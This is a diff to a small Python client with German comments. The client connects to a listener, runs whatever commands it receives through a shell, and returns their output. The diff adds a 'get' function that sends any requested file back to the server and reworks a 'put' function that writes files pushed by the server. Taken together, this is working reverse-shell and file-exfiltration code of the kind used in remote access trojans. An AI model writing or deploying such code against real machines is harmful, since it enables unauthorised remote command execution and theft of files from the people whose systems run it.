@@ -1,5 +1,6 @@
 import socket
 import subprocess
+import os
 
 HOST = '127.0.0.1'#ip zu der die connection hergestellt werden soll
 PORT = 9999
@@ -11,23 +12,28 @@ while True:
         break
     except:
         print("server not online")
-        
 
-def put_recieve(befehl):
-    print("enter put_reieve")
-    filename = str(s.recv(), "utf8")
-    print ("Filename=", filename)
-    si = s.recv()
-    print ("SI=",si, "str (SI)=",str(si, "utf8"))
-    size = int(str(si))
-    print(size)
-    data = s.recv(size)
-    print(str(filename), int(size))
-    fiel = open(str(filename), "wb")
-    file.write(data)
-    file.flush()
-    print("leave put_reieve")
+def put_recieve():
+    pfil = s.recv(256)
+    pfilename = str(pfil, "utf8")
+    psi = s.recv(256)
+    psize = int(str(psi, "utf8"))
+    pdata = s.recv(psize)
+    pfile = open(str(pfilename), "wb")
+    pfile.write(pdata)
+    pfile.flush()
+    pfile.close()
     
+    
+def get_send():
+    gfil = s.recv(256)
+    gfilename = str(gfil, "utf8")
+    gfile = open(gfilename, "rb")
+    gsize = os.path.getsize(gfilename)
+    gdata = gfile.read()
+    s.send(bytes(str(gsize), "utf8"))
+    s.send(gdata)
+
 def command():
     while True:
         bef = s.recv(1024)
@@ -35,13 +41,11 @@ def command():
         if befehl == 'quit':
             s.close()
             break
-        elif "put" in befehl: put_recieve(befehl)
-        elif "get" in befehl: get_send(befehl)
+        elif "put" in befehl: put_recieve()
+        elif "get" in befehl: get_send()
         else:
             prozess = subprocess.Popen(befehl, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
             output = prozess.stdout.read() + prozess.stderr.read()
             s.send(bytes(str(output), "utf8"))
 
 command()
-
-
